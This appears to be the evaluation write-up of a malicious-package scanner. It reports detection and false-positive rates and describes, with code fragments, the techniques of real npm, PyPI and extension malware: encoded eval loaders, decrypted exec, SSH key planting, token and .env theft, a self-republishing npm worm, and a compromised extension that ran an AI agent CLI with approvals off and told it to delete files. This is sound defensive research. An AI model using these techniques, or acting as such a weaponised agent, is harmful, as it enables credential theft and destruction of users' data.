That is **14 false positives in 1,989 benign packages (0.7%, 0.4-1.2)**, against 5 of 595 (0.8%) in the first two draws; together 19 of 2,584 (0.7%, 0.5-1.1). The 16 packages that scored 30 or more were read and moved to `dev`. With the fixes, the 1,971 left in the holdout score below 50, and so do the 16 (0 of 2,809 clean packages in the corpus); malicious recall did not move (`dev` 490 of 626, holdout 639 of 883). The clean holdout count is now what was never flagged, as before: 0 of 2,424 is not the false-positive rate, 0.7% is.

### A second npm source, and registry metadata measured and not built (ruleset 2026.11.7)

**A second npm source.** Every npm sample came from the DataDog dataset. The replication package of "How Effective Are NPM Malicious Package Detectors? A Large-Scale Empirical Study" (ASE 2026, [the ASE 2026 npm study](https://doi.org/10.6084/m9.figshare.31869370)) holds 6,547 malicious npm tarballs from four academic collections and two advisory feeds, each reviewed by three people; 3,529 of its package names are not in the DataDog dataset. 200 of those were drawn into the holdout (`sample_malicious.py --npmstudy`, seed 20261117) and nobody read them. `eval/fetch_npmstudy.py` reads the 200 out of the 4.8 GB archive with HTTP range requests. **159 of 200 (80%, 73-85)**, against 148 of 193 (77%) on DataDog npm dated before August 2026: the npm rules are not fitted to one dataset. The study's samples are mostly from 2021 to 2024, so this says nothing about the newest malware; the 46% on samples dated August 2026 or later stands.

**Registry metadata, measured and not built.** The DataDog dataset stores the npm registry document of each package next to the sample (830 of 831 npm samples). Cut at the scanned version's publish time, so that later versions and takedowns do not leak in, it gives what a scan on the day would have seen. Eight signals were counted on the npm samples and on the 394 clean npm packages (their registry documents cut the same way):

| signal | holdout missed (151) | dev missed (97) | clean (394) |
|---|---|---|---|
| new package: first version at most 2 days before, at most 3 versions | 86 | 54 | 160 |
| no repository, homepage or description | 14 | 9 | 27 |
| at least 5 versions in 24 hours | 9 | 6 | 15 |
| published by an account no earlier version was published by, package at least 30 days old | 7 | 6 | 10 |
| first release after 180 days without one | 2 | 2 | 35 |
| install script added in this version (already a registry check) | 1 | 2 | 0 |
| version jump to 90 or more (already `Dependency Confusion Version`) | 1 | 0 | 0 |

No signal and no pair of signals separates the misses from clean packages: the best pair (a burst of versions and no repository) holds 3 holdout and 2 `dev` misses and 1 clean package. A new package with no repository is what most new npm packages look like. Nothing was built.

### Reading the newest misses (ruleset 2026.11.7)

**What was read.** The 44 `tune-recent-2026-11` samples (`dev`, npm, dated August to October 2026) that ruleset 2026.11.6 missed, sorted by why:

| why it is missed | samples |
|---|---|
| nothing malicious in the package's own files: a sibling of a campaign's package (`@toptal/picasso-*` at version 100.0.x, `@wizloft/harness-*`), a placeholder, a researcher's probe, a web page, a payload kept as data | 26 |
| a native binary and a manifest, nothing else | 4 |
| the behaviour is in plain code and the findings stay weak (a launcher that downloads a binary, a fork of a large library) | 11 |
| an obfuscator the rules did not know | 3 |

Thirty of 44 carry no code a reader could call malicious, which is most of the gap between the newest samples and the rest of the holdout.

**What was added.** Five rules and three chains, each for a technique, not a name: a packer's swap-shuffle string decoder (`Shuffled String Loader`), a string table behind kana identifiers, code written to the stdin of a detached interpreter started with no script, a base64 shell script inside `package.json`, a javascript-obfuscator line appended to a readable file (`Chain: Obfuscated Code Appended to Readable Source`) a program copied under the name of a Windows system process (`Chain: Executable Copied Under a System Process Name`), and a native executable kept in a dot-directory of the package next to a process started detached (`Chain: Hidden Bundled Binary Started Detached`, the compromised `@memtensor/memos-cloud-openclaw-plugin`).

Two of the 44 were read twice and stay unexplained by any code: `charclass` is a copy of someone else's library published by a stranger, `jimg` a release by its own author with nothing added. One more pattern got no rule: `module-relpath` carves bytes from the end of an image, but never calls the function that does it, and image parsers slice buffers from the end too.

**Result.** `tune-recent-2026-11` 36 → 44 of 80, `dev` 480 → 490 of 626. **The holdout moved by two: 478 → 480 of 683** (both in `recent-2026-11`, 31 → 33 of 60; dated August 2026 or later 87 → 89 of 195). None of the eight fires on a clean package (0 of 822). The appended-obfuscation chain fires on 11 holdout and 8 `dev` samples, nearly all of them caught already by another chain. A static scan of the newest npm malware is near its ceiling on this dataset; the dependency scan below and the registry checks work on what the files do not show.

### One hop into the dependencies, and a time slice (ruleset 2026.11.6)

**What was left.** After the npm round below, about a third of each npm batch had nothing malicious in the package's own files. The largest part of that third that a scanner can still reach is a payload kept in a dependency: `debug-fmt` is a copy of a known library plus one dependency, `debug-glitz`, published the same day; the hijacked `@mastra/*` releases add `easy-day-js`.

**Measured before it was built.** For every npm sample and every clean npm package the direct dependencies were looked up in the registry (npm keeps the publish times of a package it has replaced with a security placeholder). A dependency is *young* when its first version came out at most 30 days before the package that needs it:

| | packages | with a young dependency | whose young dependency scans at 50 or more |
|---|---|---|---|
| clean npm | 394 | 29 | 0 |
| `dev`, missed | 107 | 22 | 11 |
| holdout, missed | 153 | 26 | 12 |
| `dev` and holdout, already caught | 571 | 13 | 9 |

The dependency was scanned from the DataDog dataset when it is a sample there (the registry copy is gone), for clean packages from the registry. Young dependencies of clean packages are monorepo siblings and platform builds, published by the same release; none scans above 15. For 5 missed holdout packages and 3 `dev` ones the young dependency is in neither place, so the count is a lower bound.

**What was built.** A scan of `npm:name@version` now looks up the dependencies that this version added (all of them while the package has five versions or fewer), skips siblings (`@scope/…`, `name-<platform>`), reads the registry document of each up to 256 KB (an established package is cut off there and never read in full), and scans the ones that were young, three at most, one hop deep (`young_dependencies` in `src/registry.rs`, `malicious_dependencies` in `src/lib.rs`). A dependency at risk 50 or more gives the package `Chain: Malicious New Dependency`. Replayed on the registry documents the dataset keeps, the rule for which dependencies to look at keeps all 23 packages of the table. On the 393 clean npm packages, scanned live with it: 0 flagged, no package carries the chain, median scan time 1.9 s.

**What it does to the numbers: nothing in the table at the top, and that is deliberate.** The harness scans extracted archives; a registry lookup needs the name and the day. The replay says a live scan on the day would have caught 12 more holdout samples: **490 of 683 (72%, 68-75)**, 9 of the 12 in `fresh2-2026-11`. Of the samples dated August or later it adds 3 (90 of 195). This is a registry check like the others: it works on `kalascan scan npm:…`, `kalascan guard` and lockfile audits, not on a tarball handed over as a file.

**The time slice.** A holdout drawn from later months than every tuning batch was the plan, and the dataset does not allow it: 744 files are dated August to October, and only 26 package names among them were unused. Those 26 are `late-2026-11` (13 of 26 on first count). The slice in the table at the top is the substitute: every holdout sample dated August or later, whatever its set. Tuning batches from here on are drawn from before August (`sample_malicious.py --since 2026-01-01 --before 2026-08-01`), so that the slice stays ahead of what the rules were written from. One caveat: `tune-recent-2026-11` (80 samples, read for ruleset 2026.11.2) is from the same months.

### npm tuning with GuardDog as a second reader (ruleset 2026.11.5)

The round before this one tuned on IDE extensions and moved no holdout number, because the largest gap is npm. This round went at npm, and used GuardDog to point at what KalaScan misses.

**A new holdout first.** The `fresh-2026-11` count had been read three times, so before any rule changed a new set was drawn (`sample_malicious.py --since 2026-01-01 --ecosystem npm --size 150 --seed 20261121` and `--malregistry --size 50`; `"set": "fresh2-2026-11"`). With ruleset 2026.11.4 it scored **138 of 196 (70%)**; the whole holdout was 444 of 657.

**A tuning batch, read.** Separately, 200 npm packages dated 2026 went into `dev` (`--size 200 --seed 20261122`; `"set": "tune-npm-2026-11"`, no name shared with the holdout). Before any change: 139 of 200. Of its 61 misses:

- **A self-decoding `eval` wrapper** (8, compromised releases of `autotel-*`, `awaitly-postgres`, `executable-stories-playwright`, `node-env-resolver` and two `@redhat-cloud-services` packages, June 2026): a 4.5 MB `index.js` planted next to the real build, `eval(function(s,n){…fromCharCode…}([40,109,…]))`. Now `Code Decoded From a Number Array and Evaluated`, a verdict on its own.
- **A launcher for a binary under another name** (13 + 1 binary package): packages named after companies (`ycombinator`, `motherduck`, `sourcery-ai`, cities) with a `0.0.0-dev-…` version, each a copy of an open-source CLI's npm installer whose wrapper and platform packages are called `stardrop`. The package's own code is the installer; the payload is the binary. What a scan can see is the mismatch: the command, wrapper and `stardrop-<os>-<arch>` packages carry one name, the package another, and an install hook runs. Now `Chain: Platform Binary Under Another Name` (`foreign_binary` in `src/correlate.rs`; a real CLI shares its binary's name, `turbo` / `turbo-darwin-64`).
- **An SSH key planted by a logger** (4): `pino-pretty-logger` look-alikes that append a hard-coded public key to `~/.ssh/authorized_keys`, then walk the home directory for `.env` files and upload them. Now `Chain: SSH Key Planted`, which needs the public key in the code: Remote - SSH writes the user's own key there and was flagged by the first version (below). One of the four fetches its key and is not caught.
- **Smaller fixes**: remote code run through `new (Function.constructor)("require", …)` and through `axios_1.default.get` (2; the chain existed, the patterns missed these spellings), `require(Buffer.from('ZnM=','base64').toString())` (`Module Name Decoded From Base64`, a lead), an install script that runs `uname -a` through its own helper and posts it, a Node `lib.request({hostname: …})` call (`URL Fetch Command`).
- **Out of reach** (about 30): `@mastra/*` compromised versions with no payload in the package, helpers whose payload is in a dependency (`debug-fmt` → `debug-glitz`, `ts-big-number` → `npm-doc-builder`), research probes that write a file to `/tmp`, a proxy-node deployer, a WhatsApp library fork.

After the changes the batch scores 166 of 200.

**GuardDog as a second reader.** GuardDog 3.2.0 was run on every `dev` sample and every clean sample (not on the holdout). Of 182 `dev` samples KalaScan missed, GuardDog's threat rules caught 57. Ranked by how many of those misses a rule caught against how many of the 821 clean packages it flags, the one clean signal was `threat-runtime-obfuscation-dynamic-eval` (16 misses, 0 clean): the wrapper above, now covered. The rest flag clean packages too (`threat-process-spawn-silent` 20 misses and 11 clean, `threat-network-exfiltration` 14 and 16, `threat-filesystem-read` 23 and 56); the `dev` samples behind them were read and gave the smaller fixes above, plus one more:

- **Code behind padding** (`utils-mf`, 15 MB): 11 MB of `\u00a0\u200e\n` put the obfuscated payload at 4.1 MB, between the first 3 MiB and the last 1 MiB the scanner reads. An oversized file is now read with whitespace runs longer than 64 bytes collapsed, and a script with 1 MiB or more of them gets `Code Hidden Behind Whitespace Padding` (critical, not a verdict alone). Line numbers in such a file count from the collapsed text.

**The holdout, counted once after the changes: 444 → 465 of 657 (71%, 67-74).** `fresh2-2026-11` 138 → 156 of 196 (80%, 73-85), npm across the holdout 201 → 221 of 361. The 21 holdout samples that crossed 50 did so on `Code Decoded From a Number Array and Evaluated` (10), `Chain: Platform Binary Under Another Name` (9) and `Chain: SSH Key Planted` (2): the same campaigns as in the tuning batch, which is what a holdout drawn from the same months should show. The older sets barely moved (`fresh-2026-11` 89 → 90, original 103 → 105). No sample's score went down, the evasion suite catches the same pairs.

**The clean side, first contact.** The first run of the new rules flagged 3 clean holdout packages at 90: `ms-vscode-remote.remote-ssh` (its help text appends `${pubKey}` to `authorized_keys`), `saoudrizwan.claude-dev` (a minified `C("hostname")` read as a recon helper call) and `liangzimixin`, a random npm draw that hides `node:child_process` behind base64 from its plugin marketplace's scanner. The SSH chain now needs a key in the code, the helper-call pattern takes `whoami` and `uname -a` only, and the base64 module rule is a lead, not a verdict. The three were read, so they are in `dev` now; the clean corpus is 0 of 822 again.

Ruleset 2026.11.4 (next section) moved none of the holdout numbers.

### IDE extensions, and two ideas measured and not built (ruleset 2026.11.4)

**A tuning batch of extensions.** The extension rate on the holdout (32 of 48) had not moved since the first rules. `sample_malicious.py --ecosystem ide_extensions --seed 20261120` drew every extension name in the DataDog dataset that the corpus did not have yet: 24, in `dev` as `"set": "tune-ext-2026-11"`. One holds 11,859 files, over the scanner's 10,000-file limit, and counts as an error. Before any change the batch scored 9 of 23. It was read inside the throwaway VM. Its 14 misses:

- **An AI agent used as the payload** (`amazon-q-vscode` 1.84.0, the compromised release): a prompt that tells the agent to delete the user's files and cloud resources, run with `q --trust-all-tools --no-interactive`. Two things hid it. The code sits at the end of a 21 MB bundle and the scanner read the first 4 MiB of a file; it now reads the first 3 MiB and the last 1 MiB of a file over the limit. And nothing in it is a known API: now `Agent CLI Run With Permissions Disabled` (the approval-bypass flags of Amazon Q, Claude Code, Codex and Gemini CLI), which every agent harness also has and so is a lead, and `Chain: Weaponised AI Agent` when the text around it asks for deletion or for keys and wallets.
- **`child_process` cut in two** (1): a javascript-obfuscator string table holding `'child_proc'` and `'ess'`, and an ngrok TCP tunnel. Now `Split child_process Name`, which counts as process execution in the chains.
- **Commands over DNS** (1): TXT records of an attacker's domain, joined and handed to `eval`. Now `DNS TXT Query` and `Chain: DNS Tunnel Command Execution`.
- **Git hooks for every repository** (1): downloads, decrypts and starts a binary, then runs `git config --global core.hooksPath` towards a directory it fills. Now `Global Git Hooks Path Set` and `Chain: Git Hook Persistence`.
- **Nothing malicious in the code** (10): hello-world extensions, themes, forks of a legitimate extension, research probes. The listing was the offence.

After the changes the batch scores 13 of 23. The split-name rule catches one more `dev` sample (`tune-recent-2026-11` 35 → 36 of 80). **The holdout did not move: 306 of 461, extensions 32 of 48.** Four holdout scores changed and none crossed 50. The four behaviours are real and now have a name, and no unread sample needed them; what the 16 extension misses in the holdout are is not known, because they are not read. Treat this round as coverage of known incidents, not as a gain in the rate.

Reading the end of large files cost one false positive before it was merged: `github.copilot-chat` (clean, `dev`) went from 20 to 90. In the tail of its 20 MB bundle a command descriptor, `{command: "workbench.extensions.installExtension", arguments: [id]}`, matched `VS Code Extension Side-loading` next to a `fetch`. The rule now skips descriptors (the installed thing is not visible there). The clean corpus is back at 0 of 822; the highest clean score is 40 (Quokka). The same extension bundles an agent CLI and so carries `Agent CLI Run With Permissions Disabled` as a lead. The evasion suite catches the same pairs as before.

The `fresh-2026-11` count has now been read three times (78, 89, 89); the next round drew a new holdout first (above).

**Registry history as a signal: measured, not built.** Malicious samples are scanned as extracted archives, so the registry checks (install script added, provenance dropped, manifest confusion, version gap) never ran on them, and what they would add to recall was unknown. The DataDog dataset keeps the registry document of each npm sample from the day it was collected: found for 243 of 244 `dev` and all 211 holdout npm samples. The checks were replayed on those documents, with ruleset 2026.11.3:

- The npm misses are almost all packages that were malicious from their first version (`malicious_intent`: 78 `dev`, 108 holdout). Compromised versions of real packages, where a history exists to compare with, are 4 `dev` misses and 1 holdout miss.
- On the missed samples: an install script added in the malicious version, 0 `dev` and 1 holdout; provenance dropped together with a new publisher, 3 `dev` (the `@mastra/*` packages) and 0 holdout; manifest confusion, 0 of 454; the version gap fires only on samples already caught.
- On the full history of the 394 clean npm packages (23,756 steps from one version to the next, 49 packages that ever published with provenance), provenance dropped with a different publisher happened in 5 legitimate packages, axios, vue, node-gyp and mongoose among them. It cannot be a verdict.

So the registry checks stay what they are, context on a live scan, and recall on new npm malware will not come from them: one holdout sample at most.

**Install hooks that hand off to another package: measured, not built.** A hook that runs `npx other-package`: 1 `dev` miss, 0 in the holdout. A dependency aliased to another name (`"x": "npm:other@…"`, an ordinary npm feature): 3 `dev` misses; in the holdout 3 samples already caught and 2 missed. Too few, and too close to normal use, for a rule.

### Tuning on 2026 samples (ruleset 2026.11.3)

The `fresh` holdout below scored 78 of 159 with ruleset 2026.11.2, npm 37 of 100. To improve on that without reading it, a separate batch was drawn into `dev` and read instead (`"set": "tune-fresh-2026-11"`): 100 npm packages dated 2026-01-01 or later (`sample_malicious.py --since 2026-01-01 --seed 20261119`) and 50 PyPI packages from pypi_malregistry (`--malregistry --size 50 --seed 20261119`). It was read inside the throwaway VM; only text excerpts left it. Before any change it scored 96 of 150 (npm 63, PyPI 33). Its 54 misses:

- **Fernet-wrapped loaders** (7 PyPI): a `setup.py` install hook that runs `exec(Fernet(key).decrypt(blob))` on Windows, or writes the same line to a file and starts it. Now `Decrypted Code Executed`, a verdict on its own.
- **Builtin names spelled from other objects** (5 PyPI): `''.join(map(getattr(__builtins__, oct.__str__()[-3] + hex.__str__()[-4] + copyright.__str__()[4]), […]))` builds `chr` and then every string, with CJK variable names. Now `Builtin Name Built From Characters`, a verdict on its own.
- **Copies of aiohttp with a hidden zip** (2 PyPI): a file named `server.crt` or `_websocket.typed` is a zip of Python modules, loaded with `zipimport.zipimporter(…).load_module()` or put on `sys.path`. Now `Code Imported From Disguised Archive`.
- **A worm in a compromised scope** (5 npm, `@emilgroup/*`): one variant installs a Python payload as a systemd user service from `postinstall`; the other reads npm tokens from `.npmrc` and the environment, lists every package the account maintains (`/-/v1/search?text=maintainer:`) and republishes each with the payload. Now `Chain: Install-time Persistence` and `Chain: npm Worm`.
- **Smaller fixes**: javascript-obfuscator output whose only fixed shape is the decoder's `if(t['\x..']===undefined)` check (2), a `postinstall` that downloads and runs a binary from a pinggy tunnel (2), `npm publish` run through a script's own `run()` wrapper.
- **Out of reach or not malware** (about 30): compromised versions with no payload in the package (`@mastra/*`, the `stardrop` platform packages), proofs of concept that write to `/tmp`, a dependency-confusion probe whose payload is downloaded, an SSH key planted in `authorized_keys` by an otherwise ordinary logger, a hardcoded GitHub token that patches a gist, one-off Telegram bots.

After the changes the batch scores 120 of 150 (npm 72, PyPI 48). On the holdout, which was not read: **281 → 306 of 461**, `fresh` 78 → 89 of 159, `malregistry` 70 → 83 of 95, the original 147 from 101 to 103. Every gain on `fresh` is PyPI (41 → 52 of 59); npm stays at 37 of 100. No sample's score went down, the clean corpus stays at 0 of 822 (the highest clean score is 40, Quokka), and the evasion suite catches the same pairs as before.

### A fresh holdout and the sandbox (2026-11-18)

**A holdout drawn after the rules.** Every holdout count since November had been read after each rule change, so a new set was drawn once ruleset 2026.11.2 was released (`sample_malicious.py --since 2026-08-01 --seed 20261118`, npm and PyPI, plus `--malregistry --size 60`; `"set": "fresh-2026-11"`). Only one PyPI name dated August or later was left unused in the DataDog dataset, so the PyPI side comes from pypi_malregistry. Nobody has read these samples. Their count has been read twice: with ruleset 2026.11.2 and after the tuning above.

With ruleset 2026.11.2 they scored **78 of 159 (49%, 41-57)**: npm 37 of 100, PyPI 41 of 59. That is the number to expect on new malware; ruleset 2026.11.3 reaches 89 (56%, 48-63), all of the gain on PyPI. It is lower than the 31 of 60 on `recent-2026-11` and the 35 of 80 on the npm tuning batch: rules tuned on one batch of new npm malware carried over to the next only in part. 63 of the 100 npm samples score under 30.

**The sandbox, measured once.** The same corpus was scanned again with `--sandbox`, which runs a package's install hooks (npm lifecycle scripts, `setup.py install`, `.pth` files) under strace with bait credentials in `$HOME` and a fake network. The run was in a throwaway OrbStack machine (Ubuntu 24.04 arm64, `--isolated --isolate-network`: no host file sharing, no route to the host's services), with the 1.15.0 release binary.

- Every count was the same as the static run, at every threshold: 452 of 714 malicious, 0 of 822 clean. Bait credentials were opened by three malicious samples, all three already caught.
- Why, from the 71 `dev` misses with an archive: 58 have no install hook at all, the payload runs when the package is imported or the app is started. The 13 hooks were a `chmod` of a bundled binary, an "is Electron installed" check, a proof of concept that writes `/tmp/test.txt`, and hooks that fail at once because a dependency or `bun` is missing (no network, no `node_modules`).
- A prototype went one step further: load the entry point (`require()` the package, `import` its top-level modules) with every missing dependency replaced by a stub that accepts any call. It saw a DNS lookup on 3 of the 71 and a bait file opened on none, so it was not built into KalaScan.
- The VM is arm64. Bundled `x86_64` binaries (one `dev` miss ships one) are not executed there.

The sandbox catches install-time behaviour, and the samples that get past the static rules are mostly not that. It stays opt-in and outside the published numbers; its false-positive count on the clean corpus (0 of 822) is the one thing this run adds.

### Tuning on the newest npm samples (ruleset 2026.11.2)

The `recent` holdout set scored 24 of 60, and reading it would have ended it as a holdout. So a second batch was drawn the same way (`sample_malicious.py --since 2026-08-01 --seed 20261118`, 80 packages, `"set": "tune-recent-2026-11"`, split `dev`) and read instead. Before any change it scored 24 of 80 (30%), close to the holdout rate. Its 56 misses were of four kinds:

- **Web pages published as packages** (11): `"main": "index.html"` or `"index.svg"`, no module at all. The registry's CDNs (unpkg, jsDelivr) serve the page under a trusted host name: phishing pages, cloned sites, an SVG whose script builds the page. Now `Chain: Web Page Published as a Package`, for an entry point that is an HTML or SVG document with script written into it.
- **Nothing malicious in the artefact** (about 24): nine `@toptal/picasso-*` packages at version 100.x that hold the real component code and no payload, platform packages that are one native binary, research probes, and helper packages whose payload lives in a sibling package. Static rules have nothing to find there.
- **Hidden strings** (2): a payload host kept as a base64 literal and evaluated two lines later (`Base64-Encoded URL`, `Buffer Decode + eval`), and javascript-obfuscator output with mangled names instead of `_0x…` (the decoder's arithmetic is now part of `Obfuscator.io Output`).
- **One-offs** (about 19): forks of a WhatsApp library with a changed endpoint, an Electron exam-cheating tool, install scripts that fetch a binary like every native package does.

After the changes the batch scores 35 of 80 (44%), and the holdout moved once: **193 → 202 of 302**, `recent` 24 → 31 of 60, original 99 → 101 of 147. About a third of this batch is out of reach for a scan of the package's own files, so the newest-npm rate has a ceiling near two in three with the present approach.

The clean corpus did its job twice while this was written. A first version of the Node decode-and-eval pattern ran case-insensitively and matched `function (` after any base64 decode: 22 of 822 clean packages flagged, found before anything was merged. And the new chain flagged one clean holdout package, `responsive-embed@1.0.0`, a Polymer element whose entry point is its demo page; the chain now needs script written into the page and no HTML Imports, and that package is in `dev`. Quokka (a clean `dev` extension) ships a base64 blob of obfuscated code that it evals as licence protection, which is why `Buffer Decode + eval` is a lead (20 points) and not a verdict.

The two new sets were drawn with `eval/sample_malicious.py` (seed 20261117, one version per package name, names already in the corpus skipped) and have not been read. `--since` makes the same draw for a later date: the way to measure, at each release, on samples newer than the rules.

**The honest false-positive number moved.** A second random draw of clean packages (`sample_clean.py --seed 20261117`, 297 scanned) was flagged 4 times at 50 or more before any fix: a webpack dev bundle whose `eval` module held a link to a `.sh` file (`@crisog/sourcecred`), a `curl … .EXE` in `circle.yml` next to an npm install script (`sapnwrfc`), a curl command line kept in a variable and run (`cco`), and zc.buildout's old `bootstrap.py` (`xbob.paper.jmlr2013`). With the first draw that is 5 false positives in 595 random packages: **0.8% (0.4-2.0)**, not the 0.3% the first draw alone suggested. A fifth package, `diverse_fowl_z3n`, was a registry spam publisher like `democratic_trout_z3n` and is left out of the corpus. The four are fixed and stay in `dev` (`"set": "fit-2026-11"`): the clean half the v2 score weights are fitted on. The 0/456 on the holdout is what remains unseen.

**The harness scanned the wrong directory for some wheels.** A dataset archive of a PyPI wheel holds the wheel's files and, for some samples, a `sources/` checkout of the linked repository. `package_root` looked for `setup.py` / `pyproject.toml` / `PKG-INFO` and so picked `sources/` for those samples. It now takes a `*.dist-info` directory as a package root too, which is what pip installs. That, and reading name and version from a wheel's `METADATA`, moved the original holdout from 94 to 99 of 147 (ruleset 2026.11.1).

**The holdout number is still the one to quote.** Until November 2026 the holdout split held 27 malicious samples and scored 26/27 (96%). 120 fresh samples were then added with a fixed seed (40 npm and 40 PyPI packages first published to the dataset in 2026, 40 extensions, one version per package name), and none of them has been read. On those 120 alone KalaScan catches 56 (47%): the earlier figure was a small-sample artefact, and rules tuned on 2022-2025 samples generalise worse than it suggested.

Before the two new sets and the harness fix, holdout recall by ecosystem was IDE extensions 32/48 (67%), npm 29/51 (57%), PyPI 33/48 (69%); the current figures are above. The highest score among the picked clean packages is 23, among the random ones 38 (`tavallio-agent`, below). The 161 picked clean npm/PyPI targets also go through the registry checks (manifest confusion, install script added, provenance dropped, lapsed maintainer email domain) without a finding. Before this work the dev split scored 1/60, and marketplace-id scans failed outright.

### Tuning on fresh samples (November 2026)

PyPI was the weak spot (22 of 48 holdout samples). Rather than read the holdout misses, a separate tuning batch was drawn into `dev` (`"set": "tune-2026-11"`): every 2026 PyPI package in the dataset not used before (41), 19 PyPI packages from 2025 and 40 npm packages from 2026, one version each. Before any change it scored PyPI 27/60 and npm 23/40, close to the holdout rates, so it stood in for them. Reading its 50 misses showed what the rules did not know:

- npm install scripts that run `curl` / `nslookup` themselves next to `$(whoami)` or a dependency-confusion version, and dependencies given as an http tarball on the attacker's own server (PhantomRaven);
- `setup.py` hooks that read `whoami` / `hostname` (five samples of one template), and `setup.py` code that calls a capture service at module level;
- DNS exfiltration through `socket.getaddrinfo(f"{host}.{user}.domain")`, host recon through `os.popen('whoami')` and `os.uname().nodename`;
- `exec(resp.read())` after `urlopen`, `curl` run through `subprocess` and its output handed to `node -e`, `os.environ` collected into a dict and posted to a raw IP;
- `__import__('zlib').decompress(__import__('base64').b64decode(…))` loaders, and Telegram bot tokens used through a library rather than a URL.

After the changes: tuning batch PyPI 42/60, npm 28/40; holdout **82 → 94 of 147**, PyPI 22 → 33 of 48. No sample that was caught before was lost. The 12 holdout gains came from `Chain: Reconnaissance Beacon` (6), `Chain: Install-time Reconnaissance` (5), `Chain: Install-time Exfiltration` (2), data flow (2) and a remote URL dependency (1). Every new rule and chain fires on none of the 526 clean packages.

The data-flow pass was the risky part. Its first version ignored statement order and treated `.send()` as a network call, and flagged **53 of 526 clean packages**: `process.env` spread into a `fork()` option and an unrelated IPC `.send()`, a variable reused by two functions in a bundle, `eval(r.text)` used to parse a response. It now reads statements in order, counts only named network APIs, skips files over 64 KB or with minified lines, and needs a variable (not `curl` itself) to reach an interpreter. That cost two holdout detections (96 → 94) and brought the clean count back to 0. The ten clean packages looked at while fixing it are in `dev` now.

### Score model v2

`eval/fit_weights.py` fits a weight per finding on the `dev` split (`rules/weights.toml`), used by `kalascan scan --score-model v2`. [docs/scoring.md](../docs/scoring.md) has the model, how its two parameters were chosen by cross-validation, and the result of the one evaluation on the holdout.

### Compared with GuardDog

`python3 eval/run_eval.py --scanner guarddog --dataset ~/kalascan-corpus` runs [GuardDog](https://github.com/DataDog/guarddog) (3.2.0, Docker image) on the same samples. GuardDog reports rule hits rather than a score, so two readings are given: a `threat-*` or metadata rule fired, and any rule at all fired (`capability-*` rules describe what code can do, not that it is malicious).

| | malicious, holdout | clean holdout, picked | clean holdout, random |
|---|---|---|---|
| KalaScan (risk >= 50) | 639/883 (72%, 69-75) | 0/159 | 0/294 |
| GuardDog, threat or metadata rule | 608/883 (69%, 66-72) | 86/159 (54%) | 47/294 (16%) |
| GuardDog, any rule | 725/883 (82%, 79-84) | 154/159 (97%) | 148/294 (50%) |

Run on 2026-11-19 on the whole holdout, KalaScan with ruleset 2026.11.8 (the same counts as 2026.11.7 on these samples). At GuardDog's stricter reading KalaScan catches 31 more, and not the same samples: 523 are caught by both, 116 only by KalaScan, 85 only by GuardDog, 159 by neither. By ecosystem, GuardDog then KalaScan: IDE extensions 32 and 32 of 48, npm 371 and 395 of 587 (DataDog 214 and 236 of 387, the ASE 2026 study 157 and 159 of 200), PyPI 205 and 212 of 248. By holdout set: `fresh-2026-11` 84 and 90 of 159, `fresh2-2026-11` 142 and 156 of 196, `recent-2026-11` 27 and 33 of 60, `late-2026-11` 10 and 13 of 26, `malregistry-2026-11` 81 and 83 of 95, the original 147 107 and 105.

The first run (2026-11-18, ruleset 2026.11.4, 461 holdout samples) gave the same picture: 299 for GuardDog, 306 for KalaScan, 91 of 595 random clean packages flagged by GuardDog.

The difference is on the clean side. GuardDog flags more than half of the popular packages and 16% of the random ones. KalaScan's 0 is after its flagged clean samples were read and fixed; the number to set against GuardDog's 16% is KalaScan's first contact with random packages, 19 of 2,584 (0.7%, 0.5-1.1; "Packages nobody picked, a larger draw" above).

Caveats. Most malicious samples come from DataDog's own dataset, which GuardDog's rules were developed against; the ASE 2026 study's are independent of both tools, and there the two are level (157 and 159 of 200). KalaScan's rules were tuned on `dev` samples of the DataDog dataset: in the first comparison, before the November tuning, GuardDog was ahead on the 147 holdout samples of that time (107 against 94; 66 caught by both, 16 only by KalaScan, 41 only by GuardDog, 24 by neither), and on those 147 it still is (107 against 105). The 11 holdout archives that do not unpack are outside both tools' columns.

The 60 extensions installed on the maintainer's machine (`kalascan installed`) also all score below 30. Ten of them were false positives during development and are now in the clean `dev` split.

**Honest false-positive number.** When the clean set grew from 66 to 227 samples (161 new ones in `holdout`, untouched by tuning), the first run flagged **9 of the 176 holdout clean samples (5%)**: greedy regexes (`powershell .* -enc` across a minified line, `bcdedit` inside base64), `~/.ethereum/geth.ipc` read as a wallet, a bidi character used as a regex range, official `curl … | sh` installers (gh.io, antigravity.google, nvm) and firebase-tools chmodding one file while spawning another. Those rules were fixed and the 12 samples looked at moved to `dev`; the remaining 165 holdout clean samples score below 50. Expect the real rate on unseen packages to sit somewhere between the two numbers.

**Packages nobody picked.** Popular packages are a soft test: they are well kept, and the list was partly chosen by hand. So 300 packages were drawn at random from the whole registries (`python3 eval/sample_clean.py`, seed 20261116): 150 by random rank in the [ecosyste.ms](https://packages.ecosyste.ms) npm index, 150 by random name from the PyPI simple index, each pinned to its newest version published before 2026-05-16. Registries take malicious versions down within days, so one that has survived six months is very likely benign. Rejected draws were npm 109 too new, 8 security placeholders, 7 gone, 4 over 30 MB, 2 index errors; PyPI 55 too new, 14 gone. Two scored 50 or more:

- `democratic_trout_z3n`: its publish script generates a random package name and runs `npm publish` in a loop, and this package is one of those names. `Chain: Registry Spam Publisher` exists for exactly this; it is left out of the corpus, not counted as clean.
- `tavallio-agent`, a legitimate connector for an AI agent: a device name from `os.hostname()` plus a Telegram bot integration made a `Chain: Reconnaissance Beacon`. The Telegram API host no longer counts as a beacon target, since agents and bots call it with the user's own token; a bot token written into the code still does. Malicious recall did not move (141/220, no sample's score changed), and the package now scores 38. It is in `dev`, the other 298 in `holdout`.

That is 1 false positive in 299 random packages (0.3%), PyPI 0 of 150. Nothing else reached 30.

What still got through in the original `dev` split before the November tuning (15 samples; the holdout misses are deliberately not read): forks of legitimate extensions republished with a changed API endpoint or compile server, so the user's code goes to a personal host (chatgpt-china, cppplayground, cortex-debug fork: 7 samples, nothing in the code is malicious on its own; the two that kept the original's `repository` are caught since the popular-extension list grew to 10,000); themes and hello-world extensions whose only offence is the listing (5); typo-squats with no code; an install script that patches a sibling package in `node_modules`; code that builds its C2 host at runtime.

What still gets through in the tuning batch (30 of 100): packages with no code at all (empty placeholders, a native `.node` binary, a typo-squat that copies the original), a proof-of-concept that only prints a warning, DNS exfiltration with every API name spelled as character codes, a javascript-obfuscator variant with mangled names instead of `_0x…`, environment variables stored by one function and sent by another, and a credential stealer for n8n that reads cloud metadata endpoints.
